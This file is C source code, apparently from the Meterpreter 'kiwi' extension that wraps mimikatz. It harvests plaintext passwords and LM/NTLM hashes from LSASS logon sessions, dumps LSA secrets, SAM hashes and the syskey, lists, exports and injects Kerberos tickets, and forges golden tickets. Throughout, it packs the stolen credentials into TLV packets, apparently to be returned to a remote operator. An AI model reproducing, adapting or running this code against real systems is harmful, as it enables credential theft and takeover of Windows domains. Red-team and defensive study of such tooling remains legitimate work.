#include "main.h"
#include "mimikatz_interface.h"
#include <NTSecAPI.h>

// dirty hackes to get things to build
// copied from crypto_system
#define	MD4_DIGEST_LENGTH	16
#define	MD5_DIGEST_LENGTH	16
#define SHA_DIGEST_LENGTH	20
// copied from globals
#define LM_NTLM_HASH_LENGTH	16
#define TIME_SIZE 28

#include "modules\kuhl_m_lsadump_struct.h"
#include "modules\kerberos\khul_m_kerberos_struct.h"

typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef LONG (* PKUHL_M_SEKURLSA_ENUMERATOR)(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);

extern LONG kuhl_m_sekurlsa_all_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_wdigest_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_msv_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_kerberos_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_tspkg_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_livessp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx);
extern LONG kuhl_m_kerberos_list_tickets(PKERB_CALLBACK_CTX callbackCtx, BOOL bExport);
extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
extern LONG kuhl_m_kerberos_purge_ticket();

BOOL is_unicode_string(DWORD dwBytes, LPVOID pSecret)
{
	UNICODE_STRING candidateString = { (USHORT)dwBytes, (USHORT)dwBytes, (PWSTR)pSecret };
	int unicodeTestFlags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
	return pSecret && IsTextUnicode(candidateString.Buffer, candidateString.Length, &unicodeTestFlags);
}

void CALLBACK handle_result(IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain,
	IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData)
{
	UINT hi = 0;
	UINT lo = 0;

	DWORD count = 0;
	Tlv entries[7];
	Packet* packet = (Packet*)pvData;

	ZeroMemory(&entries[0], sizeof(entries));

	if (username != NULL && username->Buffer != NULL && username->Length > 0)
	{
		dprintf("[KIWI] Adding username %u chars", username->Length);
		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length);
	}

	if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
	{
		dprintf("[KIWI] Adding domain %u chars", domain->Length);
		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length);
	}

	if (password != NULL && password->Buffer != NULL && password->Length > 0)
	{
		dprintf("[KIWI] Adding password %u chars", password->Length);
		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length);
	}

	dprintf("[KIWI] Adding auth info");
	entries[count].header.length = sizeof(UINT);
	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
	entries[count].buffer = (PUCHAR)&hi;
	++count;

	entries[count].header.length = sizeof(UINT);
	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
	entries[count].buffer = (PUCHAR)&lo;
	++count;

	if (luid != NULL)
	{
		hi = htonl((UINT)luid->HighPart);
		lo = htonl((UINT)luid->LowPart);
	}

	// 16 bytes long
	if (lm != NULL)
	{
		dprintf("[KIWI] Adding lm hash");
		entries[count].header.length = 16;
		entries[count].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
		entries[count].buffer = (PUCHAR)lm;
		++count;
	}

	// 16 bytes long
	if (ntlm != NULL)
	{
		dprintf("[KIWI] Adding ntlm hash");
		entries[count].header.length = 16;
		entries[count].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
		entries[count].buffer = (PUCHAR)ntlm;
		++count;
	}

	dprintf("[KIWI] Adding to packet");
	packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, count);
}

DWORD mimikatz_scrape_passwords(DWORD cmdId, Packet* packet)
{
	switch (cmdId)
	{
		case KIWI_PWD_ID_SEK_ALLPASS:
		{
			dprintf("[KIWI] running all pass");
			return kuhl_m_sekurlsa_all_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_WDIGEST:
		{
			dprintf("[KIWI] running wdigest");
			return kuhl_m_sekurlsa_wdigest_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_MSV:
		{
			dprintf("[KIWI] running msv");
			return kuhl_m_sekurlsa_msv_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_KERBEROS:
		{
			dprintf("[KIWI] running kerberos");
			return kuhl_m_sekurlsa_kerberos_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_TSPKG:
		{
			dprintf("[KIWI] running tspkg");
			return kuhl_m_sekurlsa_tspkg_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_LIVESSP:
		{
			dprintf("[KIWI] running livessp");
			return kuhl_m_sekurlsa_livessp_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_SSP:
		{
			dprintf("[KIWI] running ssp");
			return kuhl_m_sekurlsa_ssp_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_TICKETS:
		{
			dprintf("[KIWI] running tickets");
			break;
		}
		case KIWI_PWD_ID_SEK_DPAPI:
		{
			dprintf("[KIWI] running dpapi");
			break;
		}
	}

	return ERROR_INVALID_PARAMETER;
}

wchar_t* ascii_to_wide_string(char* ascii)
{
	size_t requiredChars = strlen(ascii) + 1;
	wchar_t* buffer = (wchar_t*)calloc(requiredChars, sizeof(wchar_t));

	if (buffer != NULL)
	{
		swprintf_s(buffer, requiredChars, L"%S", ascii);
	}
	return buffer;
}

VOID to_system_time_string(LARGE_INTEGER time, char output[TIME_SIZE])
{
	SYSTEMTIME st;
	PFILETIME pTime = (PFILETIME)&time;

	ZeroMemory(output, TIME_SIZE);
	
	FileTimeToSystemTime(pTime, &st);
	sprintf_s(output, TIME_SIZE, "%4u-%02u-%02u %02u:%02u:%02u.%03u",
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}

VOID TicketHandler(LPVOID lpContext, PKERB_TICKET_CACHE_INFO_EX pKerbTicketInfo, PKERB_EXTERNAL_TICKET pExternalTicket)
{
	Packet* packet = (Packet*)lpContext;

	Tlv entries[10];
	DWORD dwCount = 0;
	UINT uEncType = htonl(pKerbTicketInfo->EncryptionType);
	UINT uFlags = htonl(pKerbTicketInfo->TicketFlags);
	char sStart[TIME_SIZE], sEnd[TIME_SIZE], sMaxRenew[TIME_SIZE];

	dprintf("[KIWI KERB] Adding ticket to result");

	dprintf("[KIWI KERB] Converting times");
	to_system_time_string(pKerbTicketInfo->StartTime, sStart);
	to_system_time_string(pKerbTicketInfo->EndTime, sEnd);
	to_system_time_string(pKerbTicketInfo->RenewTime, sMaxRenew);

	dprintf("[KIWI KERB] Adding enc type");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_ENCTYPE;
	entries[dwCount].header.length = sizeof(UINT);
	entries[dwCount].buffer = (PUCHAR)&uEncType;
	++dwCount;

	dprintf("[KIWI KERB] Adding flags");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_FLAGS;
	entries[dwCount].header.length = sizeof(UINT);
	entries[dwCount].buffer = (PUCHAR)&uFlags;
	++dwCount;

	dprintf("[KIWI KERB] Adding start time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_START;
	entries[dwCount].header.length = (DWORD)strlen(sStart);
	entries[dwCount].buffer = (PUCHAR)sStart;
	++dwCount;

	dprintf("[KIWI KERB] Adding end time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_END;
	entries[dwCount].header.length = (DWORD)strlen(sEnd);
	entries[dwCount].buffer = (PUCHAR)sEnd;
	++dwCount;

	dprintf("[KIWI KERB] Adding max renew time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_MAXRENEW;
	entries[dwCount].header.length = (DWORD)strlen(sMaxRenew);
	entries[dwCount].buffer = (PUCHAR)sMaxRenew;
	++dwCount;

	dprintf("[KIWI KERB] Adding server name");
	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERNAME, pKerbTicketInfo->ServerName.Buffer, pKerbTicketInfo->ServerName.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding server realm");
	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERREALM, pKerbTicketInfo->ServerRealm.Buffer, pKerbTicketInfo->ServerRealm.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding client name");
	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME, pKerbTicketInfo->ClientName.Buffer, pKerbTicketInfo->ClientName.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding client realm");
	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM, pKerbTicketInfo->ClientRealm.Buffer, pKerbTicketInfo->ClientRealm.Length / sizeof(wchar_t));

	if (pExternalTicket)
	{
		dprintf("[KIWI KERB] Adding raw ticket");
		entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_RAW;
		entries[dwCount].header.length = pExternalTicket->EncodedTicketSize;
		entries[dwCount].buffer = pExternalTicket->EncodedTicket;
		++dwCount;
	}

	packet_add_tlv_group(packet, TLV_TYPE_KIWI_KERB_TKT, entries, dwCount);
}

DWORD mimikatz_kerberos_ticket_list(BOOL bExport, Packet* response)
{
	KERB_CALLBACK_CTX callbackCtx;

	callbackCtx.lpContext = response;
	callbackCtx.pTicketHandler = TicketHandler;

	return kuhl_m_kerberos_list_tickets(&callbackCtx, bExport);
}

DWORD mimikatz_kerberos_ticket_purge()
{
	return kuhl_m_kerberos_purge_ticket();
}

DWORD mimikatz_kerberos_golden_ticket_create(char* user, char* domain, char* sid, char* tgt, Packet* response)
{
	DWORD result = 0;
	BYTE* ticketBuffer;
	DWORD ticketBufferSize;
	wchar_t* wUser = ascii_to_wide_string(user);
	wchar_t* wDomain = ascii_to_wide_string(domain);
	wchar_t* wSid = ascii_to_wide_string(sid);
	wchar_t* wTgt = ascii_to_wide_string(tgt);

	do
	{
		if (!wUser || !wDomain || !wSid || !wTgt)
		{
			dprintf("[MIMIKTAZ] Out of memory");
			result = ERROR_NOT_ENOUGH_MEMORY;
		}

		result = kuhl_m_kerberos_create_golden_ticket(wUser, wDomain, wSid, wTgt, &ticketBuffer, &ticketBufferSize);
		if (result != ERROR_SUCCESS)
		{
			break;
		}

		packet_add_tlv_raw(response, TLV_TYPE_KIWI_KERB_TKT_RAW, ticketBuffer, ticketBufferSize);
	} while (0);

	if (wUser)
	{
		free(wUser);
	}
	if (wDomain)
	{
		free(wDomain);
	}
	if (wSid)
	{
		free(wSid);
	}
	if (wTgt)
	{
		free(wTgt);
	}

	return result;
}

DWORD mimikatz_kerberos_ticket_use(BYTE* buffer, DWORD bufferSize)
{
	return kuhl_m_kerberos_use_ticket(buffer, bufferSize);
}


VOID PolicyVersionHandler(LPVOID lpContext, USHORT usMajor, USHORT usMinor)
{
	Packet *response = (Packet*)lpContext;

	dprintf("[KIWI LSA] Version: %u.%u", usMajor, usMinor);

	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MAJ, (UINT)usMajor);
	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MIN, (UINT)usMinor);
}

VOID Nt5KeyHandler(LPVOID lpContext, DWORD dwIndex, PNT5_SYSTEM_KEY pSysKey)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] nt5 Key");
	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_NT5KEY, pSysKey->key, sizeof(NT5_SYSTEM_KEY));
}

VOID Nt6KeyHandler(LPVOID lpContext, DWORD dwIndex, PNT6_SYSTEM_KEY pSysKey)
{
	Tlv entities[3];
	Packet *response = (Packet*)lpContext;
	UINT uKeySize = htonl(pSysKey->KeySize);

	dprintf("[KIWI LSA] nt6 Key");

	dwIndex = htonl(dwIndex);
	entities[0].header.type = TLV_TYPE_KIWI_LSA_KEYIDX;
	entities[0].header.length = sizeof(UINT);
	entities[0].buffer = (PUCHAR)&dwIndex;

	entities[1].header.type = TLV_TYPE_KIWI_LSA_KEYID;
	entities[1].header.length = sizeof(GUID);
	entities[1].buffer = (PUCHAR)&pSysKey->KeyId;

	entities[2].header.type = TLV_TYPE_KIWI_LSA_KEYVALUE;
	entities[2].header.length = pSysKey->KeySize;
	entities[2].buffer = (PUCHAR)pSysKey->Key;

	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_NT6KEY, entities, 3);
}

VOID Nt6KeyStreamHandler(LPVOID lpContext, PNT6_SYSTEM_KEYS pSysKeyStream)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] nt6 Key stream: %u keys", pSysKeyStream->nbKeys);
	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_KEYCOUNT, pSysKeyStream->nbKeys);
}

VOID CompNameHandler(LPVOID lpContext, wchar_t* lpwComputerName)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] Computer Name: %S", lpwComputerName);
	packet_add_tlv_wstring(response, TLV_TYPE_KIWI_LSA_COMPNAME, lpwComputerName);
}

VOID SysKeyHandler(LPVOID lpContext, LPBYTE pKey, DWORD dwKeyLen)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] SysKey: %u bytes", dwKeyLen);
	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_SYSKEY, pKey, dwKeyLen);
}

VOID SecretHandler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwServiceInfo, LPBYTE pMd4Digest, LPVOID pCurrent, DWORD dwCurrentSize, LPVOID pOld, DWORD dwOldSize)
{
	Tlv entries[5];
	DWORD dwCount = 0;
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] Handling secret: %S", lpwSecretName);

	// don't bother with the entry if we don't have data for it
	if (!pCurrent && !pOld)
	{
		dprintf("[KIWI LSA] Secret has no data: %S", lpwSecretName);
		return;
	}

	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_NAME, lpwSecretName, 0);

	if (lpwServiceInfo)
	{
		packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_SERV, lpwServiceInfo, 0);
	}

	if (pMd4Digest)
	{
		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_NTLM;
		entries[dwCount].header.length = MD4_DIGEST_LENGTH;
		entries[dwCount].buffer = (PUCHAR)pMd4Digest;
		++dwCount;
	}

	if (pCurrent)
	{
		if (is_unicode_string(dwCurrentSize, pCurrent))
		{
			dprintf("[KIWI LSA] current text");
			packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_CURR, (LPCWSTR)pCurrent, dwCurrentSize / sizeof(wchar_t));
		}
		else
		{
			dprintf("[KIWI LSA] current raw");
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW;
			entries[dwCount].header.length = dwCurrentSize;
			entries[dwCount].buffer = (PUCHAR)pCurrent;
		}
		++dwCount;
	}

	if (pOld)
	{
		if (is_unicode_string(dwOldSize, pOld))
		{
			packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_OLD, (LPCWSTR)pOld,  dwCurrentSize / sizeof(wchar_t));
		}
		else
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW;
			entries[dwCount].header.length = dwOldSize;
			entries[dwCount].buffer = (PUCHAR)pOld;
		}
		++dwCount;
	}

	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SECRET, entries, dwCount);
}

VOID SamHashHandler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwUserLength, BOOL hasLmHash, BYTE lmHash[LM_NTLM_HASH_LENGTH], BOOL hasNtlmHash, BYTE ntlmHash[LM_NTLM_HASH_LENGTH])
{
	Tlv entries[4];
	DWORD dwCount = 0;
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI SAM] HERE!");

	if ((hasLmHash || hasNtlmHash) && lpwUser)
	{
		dprintf("[KIWI SAM] Adding %S rid %u (%x)", lpwUser, dwRid, dwRid);

		dwRid = htonl(dwRid);
		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_RID;
		entries[dwCount].header.length = sizeof(DWORD);
		entries[dwCount].buffer = (PUCHAR)&dwRid;
		++dwCount;

		packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SAM_USER, lpwUser, dwUserLength);

		if (hasLmHash)
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_LMHASH;
			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
			entries[dwCount].buffer = (PUCHAR)lmHash;
			++dwCount;
		}

		if (hasNtlmHash)
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_NTLMHASH;
			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
			entries[dwCount].buffer = (PUCHAR)ntlmHash;
			++dwCount;

		}

		packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SAM, entries, dwCount);
	}
	else
	{
		dprintf("[KIWI SAM] Ignoring %S, no hashes given");
	}
}

DWORD mimikatz_lsa_dump_secrets(Packet* response)
{
	LSA_CALLBACK_CTX callbackCtx;
	ZeroMemory(&callbackCtx, sizeof(callbackCtx));

	// we want the context to be the packet, so that elements
	// can be added directly to the packet
	callbackCtx.lpContext = response;
	callbackCtx.pCompNameHandler = CompNameHandler;
	callbackCtx.pSysKeyHandler = SysKeyHandler;
	callbackCtx.pPolicyVersionHandler = PolicyVersionHandler;
	callbackCtx.pNt6KeyStreamHandler = Nt6KeyStreamHandler;
	callbackCtx.pNt6KeyHandler = Nt6KeyHandler;
	callbackCtx.pNt5KeyHandler = Nt5KeyHandler;
	callbackCtx.pSecretHandler = SecretHandler;
	callbackCtx.pSamHashHandler = SamHashHandler;

	return kuhl_m_lsadump_full(&callbackCtx);
}